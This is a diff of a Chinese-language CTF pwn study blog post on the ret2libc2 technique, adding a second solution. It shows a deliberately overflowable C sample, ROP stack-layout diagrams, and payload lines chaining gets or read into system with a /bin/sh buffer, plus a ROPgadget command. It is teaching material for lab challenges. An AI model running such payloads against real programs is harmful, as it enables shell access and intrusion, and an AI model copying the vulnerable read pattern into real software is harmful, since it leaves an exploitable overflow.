@@ -24,7 +24,7 @@
 <meta property="og:description" content="利用checksec可以猜测题目大致考的方向整理没有NX，自带系统命令，直接返回地址，ret2text 没有NX，找不到system()，有可执行段，可写入shellcode，ret2shellcode （mprotected(,,7)有对某段地址提高权限的能力，可以写入shellcode） 可以有NX，找得到system()的plt的绝对地址，没有binsh，ret2libc2 有NX，利用RO">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-11-04T07:55:05.000Z">
-<meta property="article:modified_time" content="2022-12-06T15:25:24.341Z">
+<meta property="article:modified_time" content="2022-12-07T05:08:43.397Z">
 <meta property="article:author" content="OSLike">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="knowledge">
@@ -255,7 +255,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.5k 字
+          6.7k 字
         
       </span>
     
@@ -266,7 +266,7 @@
         
         
         
-          42 分钟
+          50 分钟
         
       </span>
     
@@ -327,7 +327,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2022年12月6日 晚上
+                    本文最后更新于：2022年12月7日 下午
                   
                 
               </p>
@@ -491,18 +491,28 @@
 <p>此类型题源码可能为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;定义了system函数的头文件&gt;</span></span><br><span class="hljs-comment">//char binsh[]=&quot;/bin/sh&quot;;</span><br><span class="hljs-type">char</span> save[<span class="hljs-number">100</span>];<br><span class="hljs-comment">//上述保存/bin/sh的内容不再存在，但提供了一个空的可读可写可执行区域可提供攻击者进行保存/bin/sh字符串</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sys</span><span class="hljs-params">()</span> &#123;<br>	system(<span class="hljs-string">&quot;echo ?&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>	<span class="hljs-type">int</span> buf[<span class="hljs-number">16</span>];<br>	<span class="hljs-comment">//gets(buf);	scanf(&quot;%s&quot;, buf);这三种函数都明显地可以存在栈溢出行为</span><br>	read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><p><strong>解法1：</strong>首先填充read读的栈空间，先造成一次栈溢出，本次栈溢出的返回地址为read函数的地址，我们需要利用第二次的read函数去读下一次输入（*即下一次sendline的内容）并将其内容保存到一个可读可写（不需要可执行）段中的一个寄存器中，read函数也存在一个返回值，这里首先填充函数的开头去重新执行整个程序，接下来填充read函数的三个参数，fd、读入寄存器所在地址、读入数据量（<strong>如果是scanf函数或者gets函数则不需要fd、读入字量这两个参数的构造</strong>），最后是填充上返回到system的地址，再占用system函数的返回地址，最后填入system函数调用的地址。</p>
-<p>以ctf-wiki上的ret2libc2为例，该种payload在栈中部署形态为：</p>
+<p> <strong>注意，如下两种解法都是需要后续再次自行sendline(“&#x2F;bin&#x2F;sh”)或自行输入”&#x2F;bin&#x2F;sh”的，原理均为返回到输入的函数并调用该函数，使其读入输入缓冲区中的下次输入内容。</strong></p>
+<h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><p><strong>解法1：</strong>首先填充原程序通过read函数读的栈空间，先造成一次栈溢出，本次栈溢出的返回地址为read函数的地址，我们需要利用第二次的read函数去读下一次输入（*即下一次sendline的内容）并将其内容保存到一个可读可写（不需要可执行）段中的一个寄存器中，read函数也存在一个返回地址，这里首先填充函数的开头去重新执行整个程序，接下来填充read函数的三个参数，fd、读入数组变量所在首地址、最大读入数据量（<strong>如果是scanf函数或者gets函数则不需要fd、读入字量这两个参数的构造</strong>），最后是填充上返回到system的地址，再占用system函数的返回地址，最后填入system函数调用的地址。</p>
+<p>以ctf-wiki上的ret2libc2为例（使用gets函数），该种payload在栈中部署形态为：</p>
 <blockquote>
 <p>该段内容选自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/105913529">好好说话之ret2libc2_hollk的博客-CSDN博客</a>，略作自己可以看得懂的修改。</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">+---------------------------+<br>|           buf2            | buf2中的/bin/sh作为system_plt的参数<br>+---------------------------+<br>|        0xdeadbeef         | deadbeef作为system_plt的返回地址<br>+---------------------------+<br>|        system_plt         | 调用system_plt<br>+---------------------------+<br>|           buf2            | buf2地址作为gets的参数接收bin/sh<br>+---------------------------+<br>|         pop+ebx           | gadget作为gets调用后的返回地址 <br>+---------------------------+<br>|         gets_plt          | 覆盖原ret返回位置，调用gets_plt<br>+---------------------------+<br>|           aaaa            | aaaa覆盖原saved ebp位置<br>+---------------------------+&lt;---ebp<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           ....            |        .....<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>+---------------------------+&lt;--v4终止位置，ebp-0x64<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">+---------------------------+<br>|           buf2            | buf2中的/bin/sh作为system_plt的参数<br>+---------------------------+<br>|        0xdeadbeef         | deadbeef作为system_plt的返回地址<br>+---------------------------+<br>|        system_plt         | 调用system_plt<br>+---------------------------+<br>|           buf2            | buf2地址作为gets的参数接收/bin/sh<br>+---------------------------+<br>|         pop+ebx           | gadget作为gets调用后的返回地址 <br>+---------------------------+<br>|         gets_plt          | 覆盖原ret返回位置，调用gets_plt<br>+---------------------------+<br>|           aaaa            | aaaa覆盖原saved ebp位置<br>+---------------------------+&lt;---ebp<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           ....            |        .....<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>|           aaaa            | aaaaaaaa占位填满栈空间<br>+---------------------------+&lt;--v4终止位置，ebp-0x64<br></code></pre></td></tr></table></figure>
 
 <p><code>payload = flat([b&#39;a&#39;*112, gets_plt, pop_ebx_ret, buf2, system_plt, 0xdeadbeef, buf2])</code></p>
+<p>若使用read函数，其payload可以写为</p>
+<p><code>payload = &#39;a&#39;*112 + p32(read_plt) + p32(pop_ebx_ret) + p32(0) + p32(buf2) + p32(0x100) + p32(system_plt) + p32(0xdeadbeef) + p32(buf2)</code></p>
 <p>pop_ebx_ret仅作为一个使指针上移的寄存器，弹给任何一个寄存器都没关系，只需要有返回。</p>
 <blockquote>
-<p>Ropgadget –binary ret2libc2 –only “pop|ret”</p>
+<p>ROPgadget –binary ret2libc2 –only “pop|ret”</p>
 </blockquote>
+<p><strong>解法2：</strong>首先填充原程序通过read函数读的栈空间，先造成一次栈溢出，本次栈溢出的返回地址为read函数的地址，我们需要利用第二次的read函数去读下一次输入（*即下一次sendline的内容）并将其内容保存到一个可读可写（不需要可执行）段中的一个寄存器中，read函数也存在一个返回地址，此时我们让read函数直接指向system函数的地址，接下来填入read函数的三个参数（fd、数组变量首地址、最大读入字量）（<strong>如果是scanf函数或者gets函数则不需要fd、读入字量这两个参数的构造</strong>），最后填入system函数调用的变量地址。</p>
+<p>以ctf-wiki上的ret2libc2为例（使用gets函数），该种payload在栈中部署形态（ROP链）为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">+---------------------------+<br>|           buf2            |buf2中的/bin/sh作为system_plt的参数<br>+---------------------------+<br>|           buf2            |buf2地址作为gets的参数接收/bin/sh<br>+---------------------------+<br>|         system_plt        |调用system_plt<br>+---------------------------+<br>|          get_plt          |覆盖原ret返回位置，调用gets_plt<br>+---------------------------+<br>|           aaaa            |<br>|           ....            |<br>|           aaaa            |<br>|           aaaa            |<br>+---------------------------+&lt;--v4终止位置，ebp-0x64<br></code></pre></td></tr></table></figure>
+
+<p><code>payload = &#39;a&#39;*112 + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</code></p>
+<p>若使用read函数，其payload可以写为</p>
+<p><code>payload = flat([&#39;a&#39;*112, read_plt, system_plt, 0x00, buf2, 0x100, buf2])</code></p>
 
                 
               </div>
